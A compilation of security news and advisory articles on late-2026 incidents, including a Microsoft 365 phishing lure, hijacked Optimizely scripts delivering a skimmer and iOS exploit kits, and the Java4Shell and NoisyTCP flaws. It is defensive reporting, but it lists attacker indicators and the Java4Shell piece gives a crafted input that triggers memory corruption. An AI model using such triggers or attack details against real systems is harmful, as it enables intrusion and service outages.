Title: Hackers exploit Microsoft 365 outage to launch credential phishing campaign
Context: Cybercriminals are exploiting genuine cloud service disruptions to make phishing attacks more convincing
Full Text:
Cybercriminals are exploiting genuine cloud service disruptions to make phishing attacks more convincing. Just a day after a prolonged outage disrupted several Microsoft services, including Outlook, Exchange Online, Teams and Copilot, Microsoft Threat Intelligence identified a coordinated, high-volume phishing campaign targeting organisations across multiple industry sectors.

The attackers impersonated service notifications and sent emails disguised as legitimate Microsoft 365 service-health notifications. Claiming emails held during the outage would be permanently deleted within 24 hours unless recipients restored them, the threat actors created a false sense of urgency, tricking recipients into clicking malicious links and potentially exposing their login credentials.

“We assess that the activity was likely credential phishing; however, the available evidence does not confirm credential capture, malware delivery, or post-compromise activity. Multiple threat actors may continue to look for ways to exploit notable global events in any social engineering pretext,” Jeremiah Jasmin, security researcher at Microsoft, said in a blog post.

Outages in cloud services bring about uncertainty and panic, an area where attackers always thrive, said Devroop Dhar, co-founder and MD at Primus Partners. “In cases where employees cannot access their emails and other applications, they will easily fall victim to any email promising to restore their service or help recover their account. This is especially dangerous for industries like finance, health care, government and educational institutions because employees in such organizations work with sensitive data and rely heavily on cloud services,” said Devroop Dhar, co-founder and MD at Primus Partners.

Carefully constructed phishing trap

The attackers used several techniques to make the emails appear relevant to recipients while evading basic email security filters. These included using specific sender domains, randomised outage-related subject lines, recipient-specific tracking links and a common non-Microsoft destination domain. The combination made the messages harder to identify through conventional pattern matching.

The campaign began with emails sent from domains including moments-notice[.]com, planetmaison[.]com, and newbooker[.]com. Their subject lines followed the pattern “Outage” followed by a randomised string of characters. Microsoft also found a fake email conversation embedded in the message body, positioned to remain hidden from recipients. This appeared to be an attempt to evade email filtering mechanisms.

The messages impersonated Microsoft 365 service health notifications. They used recipient-specific display name prefixes and referenced Microsoft services, including Exchange Online, Outlook, Teams, SharePoint and Copilot.

To create a sense of urgency, the emails claimed that messages held during the November 12 Exchange Online disruption would be deleted within 24 hours. Recipients were prompted to click a prominent “RESTORE MESSAGES” button. The links contained recipient-specific tracking URLs that recorded or routed clicks before redirecting users to reallifeaccounting[.]com, including the path /themelist0.html.

One of the emails analysed by Microsoft had a subject line following the pattern “Outage – ” and a display name comprising a three-character organisation-style prefix followed by “Outage Notification.” Its body referred to a purported Exchange Online incident on November 12, claimed that four messages had been held during the outage and warned that they would be deleted within 24 hours unless restored.

A successful credential theft attempt could expose more than an employee’s email account. Dhar explained that, depending on the permissions of the user, threat actors can gain access to sensitive emails, customer information, balance sheets, SharePoint, OneDrive Storage, and Microsoft Teams communication. Moreover, attackers can pretend to be representatives of the company and send believable emails to colleagues, clients, and contractors for the purposes of money fraud or theft of credentials.

From containment to preparedness

Microsoft said it had not observed any evidence of account compromise linked to the campaign. Messages detected and protected by Microsoft Defender for Office 365 were being blocked or quarantined. However, the company has advised organisations to remain vigilant and take several precautionary steps.

CISOs should search email telemetry for the identified sender domains, display-name and subject-line patterns, lure phrases, tracking hosts, and destination domains. Matching messages should be quarantined, and copies already delivered to inboxes should be removed in accordance with the organisation’s incident response procedures.

Security teams should also identify users who clicked on campaign links and review click telemetry, proxy logs, and browser or endpoint evidence to establish whether they reached the malicious destination and potentially entered their credentials. If credentials were exposed, organisations should immediately reset the affected passwords, revoke active sessions and refresh tokens, and verify multifactor authentication registrations.

They should also check affected accounts for suspicious sign-ins, unauthorised OAuth consent, new inbox or forwarding rules, delegate permissions and unusual access to Exchange Online, SharePoint, OneDrive or Teams. Microsoft has also advised security teams to block or closely monitor reallifeaccounting[.]com and the observed /themelist0.html path while the activity is investigated. Employees should be reminded that legitimate Microsoft 365 service-health communications do not direct users to non-Microsoft domains to recover held emails.

Dhar added that organizations should make cybersecurity an integral part of their business continuity planning. Any technology disruption should trigger heightened security monitoring and clear internal communication to ensure employees know how to verify service-related updates. He also recommended conducting phishing simulations during such disruptions to test how employees respond to suspicious communications. CIOs and CISOs should regularly conduct tabletop exercises to assess their preparedness for attacks that exploit technology outages.

The article originally appeared on ComputerWorld.

Title: Google spots the first hacker AI system that finds and exploits flaws autonomously
Context: Google said it had identified a hacker-operated AI framework designed to discover software vulnerabilities and execute exploits without human intervention, marking the first...
Full Text:
Google said it had identified a hacker-operated AI framework designed to discover software vulnerabilities and execute exploits without human intervention, marking the first time its researchers had observed such a system being used by threat actors.

The findings, published in a report by Google Threat Intelligence Group (GTIG) and Mandiant, suggest that attackers are moving beyond using generative AI to assist individual tasks and are beginning to automate larger portions of cyberattacks.

The system could give attackers a way to exploit publicly disclosed vulnerabilities, known as n-days, before companies finish applying security updates. Google’s researchers discovered it on an exposed staging server and identified it as a multi-agent framework called exploit_agent.

The framework connects to multiple large language models (LLMs) and is configured to examine changes in application code following security patches, identify vulnerabilities, and generate exploits without requiring an operator to direct each step. It can also execute the exploits automatically.

Google found data exfiltrated from targeted victims on the server, along with scripts designed to support further activity after an initial compromise. Evidence suggested that the operator was particularly interested in French websites associated with the media and entertainment industries and the education sector. The report did not establish whether the framework’s autonomous operations were responsible for the theft.

Google also cited a separate campaign involving vulnerabilities in PaperCut print management servers. According to research by GreyNoise referenced in Google’s report, a threat actor likely used AI tools to develop and test exploits before launching a campaign against hundreds of organizations four days after the vulnerabilities were disclosed.

In separate cases, Google observed other AI frameworks being used by attackers. CAIRN was deployed in intrusion activity targeting organizations that included the US aerospace sector, while a customized platform based on PentAGI was used to conduct reconnaissance and vulnerability scanning against organizations across Asia.

Pressure on enterprise response times

Despite the growing use of AI in cyberattacks, the underlying techniques remain largely unchanged, according to Jonathan Ong, senior analyst at Omdia.

“This is more of an acceleration of existing attack techniques,” Ong said. “These are pentesting/red-teaming frameworks with established techniques, albeit significantly sped up with an LLM model.”

Keith Prabhu, CEO of Confidis, said there is still limited evidence that AI makes individual attacks more successful. The greater risk, he said, is that attackers could launch more attempts in less time, potentially increasing the number of successful compromises even if each attempt is no more effective.

Ong said the frameworks typically generate considerable detectable activity, meaning enterprises with properly configured and monitored endpoint detection and response (EDR), extended detection and response (XDR), or managed detection and response (MDR) capabilities should still be able to identify much of the malicious activity.

Google also warned that although the frameworks generate activity that makes detection easier, they remain capable of achieving their objectives.

Rather than overhauling their defenses, security leaders should continue prioritizing established security practices, particularly cloud and identity hardening. Ong pointed to multifactor authentication, strong passwords, and measures to block repeated login attempts as effective safeguards.

“The one thing that has changed is that the containment and response timeline needs to be faster, to match the speed at which attackers using these frameworks are moving,” Ong said.

Prabhu said the problem is compounded by fragmented security visibility and response processes that still depend on manual decisions. He recommended that CISOs prioritize continuous asset discovery and risk-based vulnerability remediation. He also called for better detection capabilities that connect suspicious activity across enterprise environments.

Amit Kumar Jena, development manager for AI at Kanerika, said organizations must give particular attention to vulnerabilities in systems exposed to the internet, where attackers could exploit flaws soon after they become public.

“Internet-facing systems should be treated as their own class, with a fast-track patch path and virtual patching while fixes are tested,” Jena said.

For incident containment, Prabhu suggested automating actions that are well understood and can be reversed, while retaining human approval for decisions that could have significant operational consequences.

Jena also recommended defining in advance which containment actions could be automated, citing endpoint isolation and session revocation as examples.

“The aim is not to remove human oversight, but to eliminate avoidable delays and regularly test that response works at the pace of an attack,” Prabhu said.

Lower barriers for cybercriminals

Open-source agentic frameworks could lower the technical barriers for less-experienced cybercriminals by helping them coordinate existing tools and adapt their attacks based on results, Prabhu said. However, these capabilities do not eliminate the need for technical expertise or guarantee successful compromises.

Prabhu said smaller organizations and service providers with limited security resources could be particularly exposed.

The risk is not necessarily concentrated in any particular industry, he added. Organizations with poorly maintained legacy systems or weak identity controls could face greater exposure regardless of their sector.

Title: Hijacked Optimizely Scripts Served Card Skimmer and iOS Exploit Kits to CNN, BBC and Zoom Visitors
Context: In an incident notice posted at 01:02 UTC, Optimizely said the attacker had "exploited a vulnerability in Experimentation" and used it to add malicious JavaScript to some...
Full Text:
An attacker exploited a flaw in Optimizely Web Experimentation to plant malicious code in some of the scripts that customers' websites load from the service, Optimizely said early today.

Visitors to sites run by at least 178 organizations, including CNN, the BBC and Zoom, received the code yesterday, according to Report URI, a firm that monitors the scripts websites run.

The code was built to replace crypto wallet addresses with the attacker's own addresses and to capture card details, but the firm cannot see how many card numbers were exposed to the attacker. The vendor says it has fixed the flaw and removed the code.

On iPhones and iPads, the code was also set up to load a second stage that the firm identifies as an iOS exploit kit, but it reports no iPhones actually being taken over.

In an incident notice posted at 01:02 UTC, Optimizely said the attacker had "exploited a vulnerability in Experimentation" and used it to add malicious JavaScript to some customer projects.

The vendor has also taken steps to secure affected user accounts and added protections to stop unauthorized code from being delivered. The notice does not say how the flaw worked, how many projects were changed, when the fix went in, whether the attacker still has any access, or what customers should do.

Smartsheet's script was cleaned once and then re-infected with a hidden version of the code, which indicates the attacker still had access at that point, according to the firm.

Writing before the notice appeared, the firm said it did not know how the attacker got write access to so many unrelated customer projects: "That's for Optimizely to explain."

Sites that use the service to run experiments on their pages load a script from the vendor, called a snippet. The snippet updates itself whenever the customer changes a setting, according to the vendor's snippet documentation. Each time it loads, it runs a field of custom code called Project JavaScript.

The attacker wrote a loader into the Project JavaScript of customer projects and left the rest of each snippet untouched, Report URI said in its technical analysis. The snippets were still served from cdn.optimizely.com with the vendor's own certificate, so every page that loaded one also ran the loader.

Some sites serve the snippet from their own domain, and those were affected too, because the content comes from the same project.

The loader came in three versions. Most snippets loaded 1688360[.]cc/track.js directly, one version hid that address in base64 so a text search for the domain would miss it, and another carried a full copy of the payload that runs if the domain is blocked.

Cynet, whose endpoint detection flagged browser connections to the attacker's server, traced the loader to a file served from cdn.optimizely.com in an endpoint investigation. Its researchers also captured the code on CNN and Zoom pages. A site that delivered the code has not necessarily had its own systems compromised, the researchers say.

The firm checked 1,611 Optimizely snippets, mostly identified through its own crawl data, and found code in 188 of them, belonging to 178 organizations. It says the real number is likely higher because it could only check the snippets it found in time. Its post lists all 178, with their domains.

Besides CNN, the BBC and Zoom, the infected snippets belonged to Salesforce, GitLab, IKEA, HSBC, Equifax, Air France-KLM, Ledger and Peacock, among others. The vendor's own main site and login page also carried the code. Some researchers call the campaign OPTIMJACK.

The first injection was seen at 04:21 UTC yesterday, in the BBC's snippet. A mass cleanup began at about 20:40 UTC, and by 21:52 UTC only TalkTalk's snippet still carried the code.

That first injection loaded webshell[.]lol, which the firm calls the same actor's injector. The injector had also been planted through Kissmetrics, StorifyMe and Minute Media scripts since late last week, and it first appeared on Turkish sites on September 17.

The payload, a file called track.js, replaces valid crypto wallet addresses with the attacker's in page text, forms, links, the clipboard and outgoing requests.

It swaps only an address that passes its chain's checksum and sits near a payment word such as wallet, deposit or send, according to a payload analysis by StepSecurity. Copying is not safe either: an address a visitor copies from one of these pages may already be the attacker's by the time it is pasted into a wallet.

A card skimmer, added at 13:43 UTC, captures the card number, expiry date, and CVV when they are submitted via the site's form fields and sends them to the attacker's server. It cannot read cards entered in a cross-origin payment iframe, such as Stripe's hosted fields or Adyen's.

The code sends the visitor's cookies and a screenshot of the page to the attacker only after it swaps an address near wallet or payment wording. It cannot read cookies marked HttpOnly.

The firm identifies the iOS exploit kits as Coruna and DarkSword, as documented by Google researchers. The Coruna exploit kit targets iOS 13.0 to 17.2.1, and the DarkSword exploit kit targets iOS 18.4 to 18.7.

On iPhones and iPads, the code loads a script called boot.js from two .icu domains. That script reads the iOS version and opens an exploit chain in a hidden iframe: Coruna for iOS 13 to 17, DarkSword for iOS 18, and, for iOS 26, a separate chain that so far only collects details about the device.

Between 17:13 and 17:57 UTC, the attacker also added a Coruna iframe to every visit from iOS 18.6 or earlier. Those pages reload every 60 seconds to retry the exploit, a sign a visitor could notice. The kit's own comments mark iOS 18.7.3 and later, and iOS 26.3 and later, as patched, according to the firm.

Cynet's researchers retrieved the second stage using an emulated iPhone browser and describe what they saw as conditional delivery, "not a successful compromise of a physical iPhone or iPad."

The firm says crypto has already been stolen. As of 19:25 UTC yesterday, the attacker's wallets had received about $7,040, all within roughly nine hours.

StepSecurity put the total across the same addresses at about $6,600. Two of the addresses were already in use before the injections began, and its analysts wrote that "the chain does not show which transfers came from victims."

What Site Owners and Visitors Should Check

Report URI recommends these checks for sites that use Optimizely Web Experimentation:

Open the Project JavaScript in every project and the custom code in every experiment, and look for 1688360, atob( or any script you did not write. The atob( check finds the base64 version of the loader.

Review which users, API tokens and integrations can write to your account, and rotate their credentials.

If your own forms take card details, treat cards entered on Monday as possibly exposed.

Treat session tokens or other secrets kept in cookies without the HttpOnly flag as exposed, and rotate them.

Deploy a Content Security Policy with a strict script-src and connect-src. Allowing cdn.optimizely.com does not help, because the code came from that host, and strict-dynamic or unsafe-eval let the payload run on some sites.

Consider telling your customers that your site served them the code.

The firm kept a copy of every infected snippet, with hashes and timestamps, and could share them with affected organizations and CERTs (computer emergency response teams) on request.

For anyone who visited an affected site on Monday, the firm advises:

Update iPhones and iPads to iOS 18.7.3 or later, or iOS 26.3 or later.

Compare any crypto payment made that day with the address you meant to pay. If the two differ, the address may have been swapped.

If you paid by card on one of the sites, watch your card statements.

A snippet that is clean now may still have served the code on Monday. StepSecurity also advises:

Block the indicators below, and search logs back to 08:00 UTC on Monday.

Fetch every snippet you serve, search it for 1688360, .icu and track.js, and record its Last-Modified header.

Ask Optimizely which of your project IDs were changed, and when and how.

Keep third-party tags off checkout pages, and take card details through the payment provider's own fields in a cross-origin iframe.

Replace any card entered on an affected site on Monday, and check wallet addresses on a hardware wallet's screen rather than against copied text.

Consider having iPhones and iPads on iOS 18.6 or earlier that visited affected sites checked for signs of compromise.

Cynet treats cdn.optimizely.com as a legitimate delivery host rather than an indicator, and it advises against broad blocks of that host or of the affected news sites.

The payload changed multiple times during the day, so a single file hash will not capture every version. These indicators come from the researchers' published lists:

Domain: 1688360[.]cc, the payload host, with the paths /track.js, /card.php and /hit.php

IP: 136.113.106[.]136, the address 1688360[.]cc pointed to

Domain: 5vobauua3ojpklx[.]icu, iOS stage

Domain: eil786npto9u5bq[.]icu, iOS stage

Domain: webshell[.]lol, the injector loaded by the first injection, seen at 04:21 UTC on Monday

SHA-256: f7b84b9a94f749f8ced3f0112d0a66894e8bbc3b4aa5592021d1b8976a9bad40, final version of track.js

SHA-256: 617df364120adc47fb4f55dcc0c69a9b6c9e108a92c60bc2b64a266254ab02f3, earliest captured version of track.js

Title: ConnectWise Warns ScreenConnect Attacks Continue as SCKit Targets Unpatched Systems
Context: As highlighted by Huntress and Blackpoint Cyber last week, unknown threat actors are suspected to be exploiting an authentication flaw in RMM+ versions 1
Full Text:
ConnectWise on Monday said it completed its investigation into unauthorized access targeting partner ScreenConnect environments, and recommended customers to ensure that the technician client is running version 26.6.5 or later.

The company said additional activity targeting on-premises environments continues to be reported where the identified third-party extensions remain enabled, and ScreenConnect has not been updated to the latest version.

"On-premises partners must immediately disable the identified extensions and update ScreenConnect to the latest supported version," the company said.

It's worth noting that version 26.6.5 addresses a critical-severity flaw in ScreenConnect client tracked as CVE-2026-84869 (CVSS score: 9.9) that could allow files to be transferred and executed through an active remote session without authorization or Host confirmation in certain circumstances.

As highlighted by Huntress and Blackpoint Cyber last week, unknown threat actors are suspected to be exploiting an authentication flaw in RMM+ versions 1.0.31 and 1.0.32 to execute unauthorized commands while bypassing ScreenConnect's regular authentication controls.

The attacks have been found to deploy a multi-component toolkit dubbed SCKit that's capable of spreading from infected customer devices to MSP technicians' computers and compromising additional managed networks by means of a C# module called RelayTrap ("RelayTrap.cs").

Specifically, the malware employs a worm-like technique that exploits CVE-2026-84869 to execute malicious code on a technician's workstation when they connect to an infected device to investigate a problem. There is no evidence this worm-like behavior has succeeded in the latest campaign.

Huntress has since said it detected another spike in SCKit-related activity on November 13, 2026, impacting 205 hosts across 41 organizations.

"Across the incidents, we saw the new ScreenConnect client being hosted at 185.241.211[.]197, which is associated with 1337 Services GmbH, a bulletproof hosting provider known for previously hosting malicious traffic," the company said.

"In one of the incidents, we saw a rogue ScreenConnect client establish persistence via a service called Windows Update Agent, posing as a legitimate system component. The service executable (UpdateConnect.ClientService.exe) was placed in C:\ProgramData\Windows Update Agent (de362a425905bcc4)\ and configured to run under the LocalSystem account."

In response to the incident, ConnectWise has taken the step of disabling five third-party extensions, including Labtech Plus, RMM Plus, RMM+, RMM Plus Password Link, and RMM+ Password Link, across 400 partner environments. That said, the presence of these extensions alone does not imply those environments were impacted.

The company is also urging partners not to re-enable or reinstall the extensions until further guidance. "Disabling extensions and updating software do not remove unauthorized access or persistence already established on affected devices," it added.

Title: N-able Patches 17 N-central Flaws as Attackers Exploit Earlier Bugs to Deploy Crypto Miners
Context: N-able has released a new security update to address additional critical security flaws impacting N-central
Full Text:
N-able has released a new security update to address additional critical security flaws impacting N-central.

Describing N-central 2026.4 Hotfix 3 as a critical security update, the company said it includes a number of security patches and fixes that enhance the security of the Remote Monitoring and Management (RMM) and Unified Endpoint Management (UEM) platform.

"HF3 builds on the protections delivered in HF2 and includes further improvements across authentication and access controls, Agent and Probe communications, file handling, server components, legacy APIs, and user management," the company said.

The improvements relate to authentication and access control; Agent, Probe, and appliance security; file and import handling; server hardening; and user management controls. As part of the change, the configuration option for legacy APIs has been completely removed, permanently blocking them.

As of writing, N-able notes that both Remote control functionality and Intune integration are blocked.

Customers running on-premise N-central deployments should upgrade their servers as soon as possible to keep their environments protected. For Hosted N-central servers, no server-side action is required, as the updates are being automatically applied.

"All customers, hosted and on-premise, must upgrade all of their Agents and Probes to the latest version to be fully protected," N-able cautioned. "Agents and Probes that are not upgraded are susceptible to impersonation."

The complete list of vulnerabilities addressed in the update is listed below -

CVE-2026-129271 - N-central Patch Management Local Privilege Escalation

CVE-2026-129272 - MMS3 appliance authentication bypass via predictable passcode

CVE-2026-129273 - Audit Export syslog injection allows root command execution

CVE-2026-129274 - ServerMMS2 task result submission missing authentication

CVE-2026-129275 - repositoryItemGet missing authentication discloses policies

CVE-2026-129276 - ServerMMS2 asset data submission missing authentication

CVE-2026-129277 - ServerMMS maintenance action read missing authentication

CVE-2026-129278 - Take Control audit log tampering without authentication

CVE-2026-129279 - Password reset response discrepancy allows user enumeration

CVE-2026-129280 - ServerUI SOAP operations missing authorisation checks

CVE-2026-129281 - View-only users can set DeviceExecute configuration

CVE-2026-129282 - Test email sendmail argument injection, missing authorisation

CVE-2026-129283 - N-central custom service import XML external entity injection

CVE-2026-129284 - Report Manager and Data Export settings SSRF

CVE-2026-129285 - XMPP action response origin validation error

CVE-2026-129286 - SIS GenericFiles version path traversal leads to RCE

CVE-2026-129287 - SIS repository parser XML external entity injection

The development comes days after N-able began restricting certain N-central features and integrations following the disclosure of a new set of flaws tracked as 4EverAble2Shell and Agent2Shell.

The shortcomings can allow attackers to run arbitrary code as root and gain SYSTEM-level access to Windows systems under specific conditions. Successful exploitation of 4EverAble2Shell hinges on the legacy API mode being enabled. Because the legacy API has been removed from the latest N-central version, it plugs the attack vector.

The 4EverAble2Shell vulnerabilities have since come under active exploitation, with attackers leveraging them to deploy cryptocurrency miners on vulnerable servers.

Independent security researcher Sean Bales, who disclosed the flaws, has published additional details for 24 CVEs, stating "these are patched vulnerabilities and should not work on the latest patch."

Title: 'Java4Shell' vulnerability (CVE-2026-114938) could allow remote code execution
Context: On November 17, 2026, Oracle released updates to address multiple vulnerabilities in Java SE, including an issue in the Base64 decoder
Full Text:
On November 17, 2026, Oracle released updates to address multiple vulnerabilities in Java SE, including an issue in the Base64 decoder. This memory corruption vulnerability (CVE-2026-114938) has been dubbed “Java4Shell” and assigned a high-severity CVSS score of 8.1. The issue exists in the Base64 decoder of the x86-64 HotSpot JVM in the Java Development Kit (JDK). Successful exploitation using crafted Base64 input could crash the JVM or lead to unauthenticated remote code execution.

The U.S. Cybersecurity and Infrastructure Security Agency (CISA) issued an alert on November 17 urging organizations to patch immediately. No active exploitation has been reported as of this publication.

Recommended actions

Organizations should identify vulnerable Java runtimes and apply the November 2026 Oracle Java SE updates as appropriate. Internet-facing x86-64 services that decode untrusted Base64 input should be prioritized.

Oracle’s general workaround guidance for the November 2026 update is to block the network protocols an attack requires until patches are applied. Oracle lists the protocol for CVE-2026-114938 as “Multiple” and warns that this workaround may break application functionality.

Sophos countermeasures

SophosLabs is investigating the applicability of existing countermeasures and the feasibility of developing additional countermeasures to detect activity associated with this threat. Activity is being reviewed across customer environments and will be escalated where identified.

Title: Java4Shell: Remote Code Execution in OpenJDK (CVE-2026-114938)
Context: Exploiting this vulnerability requires the affected Java runtime to execute its AVX-512 Vector Byte Manipulation Instructions (VBMI) decoding path
Full Text:
Key points and observations

CVE-2026-114938 is an out-of-bounds write in OpenJDK's optimized Base64 decoder.

Denial of service is the more readily achievable impact where attacker-controlled input reaches the vulnerable decoder. Reliable remote code execution requires additional exploitation work tailored to the application and Java Virtual Machine (JVM) environment.

Exploiting this vulnerability requires the affected Java runtime to execute its AVX-512 Vector Byte Manipulation Instructions (VBMI) decoding path. Systems running on processors that lack AVX-512 VBMI support are not affected.

On affected x86-64 deployments, starting the JVM with -XX:UseAVX=2 disables the AVX-512 path and prevented out-of-bounds writes in our tests. Scope the flag to x86 deployments as native ARM64 JVMs do not recognize it and will fail to start if that flag is passed.

In a standalone test, the extra write corrupted a neighboring array's header and the JVM later crashed during garbage collection. The resulting damage depends on which objects occupy the overwritten memory.

What happened

On November 17, 2026, Oracle released a security update for CVE-2026-114938, an out-of-bounds write in OpenJDK’s optimized Base64 decoder. This vulnerability affects OpenJDK 17.0.6 and later and has been rated 9.2 (Critical) under CVSS 4.0.

While the vulnerability can lead to remote code execution in a worst-case scenario, it is important to stress that an attacker would have to do additional work for every application they target. There is no single, universal exploit that would work against all Java applications.

How to know if you’re affected

Oracle stated that the Java versions affected by vulnerabilities patched in this release are as below:

Java release line

Affected releases

First fixed release

Java 17

17.0.6 through versions before 17.0.21.1

17.0.21.1+4

Java 21

All versions of Java 21 before 21.0.13.1

21.0.13.1+4

Java 25

All versions of Java 25 before 25.0.5.1

25.0.5.1+4

Java 27

All versions of Java 27 before 27.0.1.1

27.0.1.1+4

In addition to running a vulnerable version of Java, the application must be running on a CPU that supports the AVX-512 VBMI decoding path. Not all systems (including modern ones) support this instruction set so it is recommended to check when prioritizing systems for patching. The following is a shell command to see if the instruction set is supported:

grep -om1 -E 'avx512[_]?vbmi' /proc/cpuinfo

If this command returns nothing, that is an indication that the CPU does not support VBMI. If the command returns avx512vbmi and/or avx512_vbmi, that is a signal that it does support VBMI and could be potentially vulnerable.

Native ARM64 Java runtimes are not affected by this vulnerability because they do not execute the vulnerable x86 AVX-512 decoding path.

An affected Java runtime and a compatible CPU are prerequisites, but the application must also pass attacker-controlled data to the vulnerable decoder. In the OpenJDK 17.0.6 build we tested, the AVX-512 path handles the basic and URL decoders returned by Base64.getDecoder() and Base64.getUrlDecoder(). The MIME decoder returned by Base64.getMimeDecoder() bypasses this path.

This distinction matters when assessing authentication and token-processing code. Base64-encoded credentials, tokens, or SAML messages expose an application only if its implementation passes the malformed value to the affected decoder. Libraries that implement their own decoding, or reject or normalize the value before calling the JDK decoder, can behave differently.

From a Java method to a native decoder

Java's Base64.Decoder supports decoding into a new array or one supplied by the caller. In both cases, it calculates the required output space before decoding. The allocating method uses that calculation directly:

public byte[] decode(byte[] src) { byte[] dst = new byte[decodedOutLength(src, 0, src.length)]; int ret = decode0(src, 0, src.length, dst); if (ret != dst.length) { dst = Arrays.copyOf(dst, ret); } return dst; }

The allocation is not the source of the overflow. Further down this call chain, HotSpot's optimizing compiler, C2, can replace decodeBlock() with a native implementation. These replacements, called intrinsics, let the JVM use specialized CPU instructions. The native implementation must respect the bounds of the Java arrays it receives.

The AVX-512 decoding routine converts each 64-byte input block into 48 output bytes. When fewer than 64 input bytes remain, a separate handler decodes the final fragment. That is where the length calculation goes wrong.

Padding produces a negative output length

Consider a value containing 128 A characters followed by one =:

value = b"A" * 128 + b"="

The first 128 characters form complete Base64 groups. The final = is invalid: Padding cannot form a group by itself. However, the initial output-length calculation does not reject this value. It counts the input and trailing padding and produces a destination length of 98 bytes.

The native routine decodes the first 128 characters into 96 bytes. It then reaches the final-fragment handler with just the = remaining.

To calculate the fragment's output size, the handler divides the remaining length by four, discards the remainder, and multiplies by three. In HotSpot's code generator, those operations are:

__ movl(output_size, length); __ shrl(output_size, 2); // Find (len / 4) * 3 (output length) __ lea(output_size, Address(output_size, output_size, Address::times_2, 0));

For a 1-byte fragment, this produces zero. The padding branch then decrements output_size for the trailing =. There is no check that the result remains nonnegative, so the count becomes -1.

The same problem occurs with other fragments containing fewer than 4 bytes.

The negative count enables a full-width store

AVX-512 supports masked stores, where individual mask bits determine which bytes reach memory. The decoder uses the output count to construct such a mask. A count of zero should permit no writes; a count of three should permit 3 output bytes.

The code starts with a 64-bit value whose bits are all set, then uses BZHI to retain the requested number of low bits:

__ movq(output_mask, -1); __ bzhiq(output_mask, output_mask, output_size);

BZHI reads its bit count from the low byte of the last operand. For -1, that byte is 255. For -2, it is 254. Both exceed the width of the 64-bit operand, so the instruction leaves all 64 bits set.

The contents of the write also follow from the implementation. The tail handler fills unused input positions with the character a before decoding the vector. Much of the excess output is consequently the repeating byte pattern 69 a6 9a. The vulnerability causes a constrained overwrite rather than a freely chosen 64-byte value.

An exception does not contain the corruption

The decoder eventually throws IllegalArgumentException for the malformed input. The Java API permits partially written output when decoding fails. Here, however, the native routine has written outside the output array altogether.

This explains why the symptom may appear far from the decoder call. A write into unused heap space can go unnoticed. A write into an object header can instead damage information that the JVM consults later, including during garbage collection. Catching the decoding exception leaves that damage in place.

Mitigation

Follow your Java runtime vendor's guidance for a fixed build. Include runtimes bundled with applications and container images in that review. After updating a container base image, rebuild and redeploy the application image. Restart affected Java processes so they use the updated runtime.

If an update cannot be deployed immediately, our tests confirmed two JVM startup options that prevented the out-of-bounds writes.

To disable the Base64 intrinsics specifically, add:

-XX:-UseBASE64Intrinsics

Alternatively, on x86-64 deployments, disable AVX-512 execution by limiting the JVM to AVX2:

-XX:UseAVX=2

Disabling the Base64 intrinsics is the narrower workaround. Limiting AVX affects other JVM operations that use AVX-512, so assess its performance impact on your workload.

Scope UseAVX=2 to x86 deployments. Native ARM64 JVMs do not execute the vulnerable code, and they do not recognize this option. Adding it to shared startup settings can prevent ARM64 services from starting.

Apply the selected option to the application's JVM startup configuration and restart the service. Check the running process, including any bundled runtime, rather than relying on the Java installation found on your shell's path. Where jcmd is available, inspect the runtime version and effective flags with:

jcmd <PID> VM.version jcmd <PID> VM.flags -all

Confirm that the process reports UseBASE64Intrinsics = false or UseAVX = 2, depending on the workaround selected.

How Datadog can help

Datadog Live Processes provide real-time visibility into the processes running on your infrastructure. You can use it to identify Java processes running on x86-64 hosts, then filter to determine which hosts are running an affected Java runtime.

Datadog Cloud Security Management reports findings for CVE-2026-114938. Check the vulnerability findings for affected hosts and container images.

Conclusion

While this vulnerability can lead to remote code execution, its practical impact depends on the environment.

Applications running on processors without AVX-512 VBMI support are not affected by this vulnerability. On affected systems, denial of service is more readily achievable than reliable code execution. Attackers seeking to execute arbitrary code would need to tailor their exploits to the Java runtime and application behavior, which complicates the development of a broadly reusable exploit.

These constraints give security teams a way to prioritize their response, but affected services still need prompt attention. Follow your runtime vendor’s guidance for a fixed build, including Java runtimes bundled with applications or container images. Where an update cannot be deployed immediately, disable the vulnerable decoding path as a temporary workaround.

Title: NoisyTCP bug gives Linux servers a remote crash problem 11 years in the making
Context: The vulnerability, tracked as CVE-2026-99288 and dubbed NoisyTCP, was discovered by security researcher Hyunwoo Kim, who says it affects almost all Linux distributions
Full Text: The researcher who sounded the alarm over Dirty Frag earlier this year has uncovered another Linux kernel flaw, and this one lets attackers crash entire servers remotely without so much as a password. The vulnerability, tracked as CVE-2026-99288 and dubbed NoisyTCP, was discovered by security researcher Hyunwoo Kim, who says it affects almost all Linux distributions. The flaw dates back to October 2015 and went unnoticed until this year, when Kim found and patched it. Attackers don't need to log in or get their hands on any credentials to cause trouble. They can simply knock the server over, although there's no evidence yet that the flaw can be used to steal data or hijack a machine. The bug is buried in Linux's TCP networking code. Two parts of the kernel can trip over each other while processing incoming traffic, leaving one trying to use memory that's already been freed. When that happens, Linux can panic and take the whole machine down with it. Kim says there's no need for any special server configuration either. Services such as Nginx, Apache, and SSH can be vulnerable straight out of the box. An attacker needs access to an open TCP port on a system that processes incoming network traffic across multiple receive queues or CPUs. Perhaps more concerning for administrators running containerized workloads, the damage isn't necessarily limited to the application being attacked. Because the flaw sits in the Linux kernel, crashing a web server inside a container can take down the underlying host and anything else running on it. Kim found that the attack was particularly effective against virtual machines. During testing, he managed to crash Nginx, Apache, and SSH servers running on QEMU/KVM virtual machines in between five seconds and two minutes. Physical hardware put up more of a fight. Even after tailoring his exploit to the target machine, Kim needed roughly 14 hours to crash a bare-metal server running Nginx. Kim has a knack for finding holes in Linux. Back in May, he uncovered Dirty Frag, a kernel bug that allowed local users to gain root privileges. That one caused headaches for administrators when a working exploit went public before patches were ready. His latest discovery, NoisyTCP, has another potentially nasty trick up its sleeve. Kim identified a second exploitation path involving a use-after-free condition, although pulling it off is considerably more difficult than simply crashing a server. In his advisory, Kim says he has developed a limited exploit targeting virtual machines in a lab environment but has yet to demonstrate a general-purpose remote code execution attack. For the moment, the confirmed impact is remote denial of service. A fix was committed to the upstream Linux kernel on November 3, but administrators will need to check whether their distribution has shipped an updated kernel. Red Hat has rated the vulnerability Important, assigning it a CVSS score of 7.5. For those unable to patch immediately, Kim suggests two temporary workarounds: disabling TCP SYN cookies or restricting incoming packet processing to a single receive queue. Neither is particularly appealing. Disabling SYN cookies reduces protection against SYN flood attacks, while limiting packet processing can hurt network performance. The former also needs to be applied separately to containers using their own network namespaces. Kim published the details on November 15, once the disclosure embargo was lifted. The bug had been hiding in plain sight since 2015, leaving Linux servers vulnerable to remote crashes for 11 years. Not bad for a flaw that doesn't even require a login. ®

